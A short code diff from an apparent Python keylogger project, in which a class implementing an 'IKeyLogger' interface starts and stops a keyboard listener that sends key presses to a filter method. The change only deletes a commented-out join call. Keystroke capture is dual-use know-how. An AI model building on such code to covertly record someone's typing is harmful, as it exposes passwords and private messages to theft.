@@ -12,7 +12,6 @@ class KeyBoard(IKeyLogger):
         if self.listening is None:
             self.listening = keyboard.Listener(on_press=self.filter)
             self.listening.start()
-            #self.listening.join()
 
     def stop_listening(self) -> None:
         if self.listening is not None:
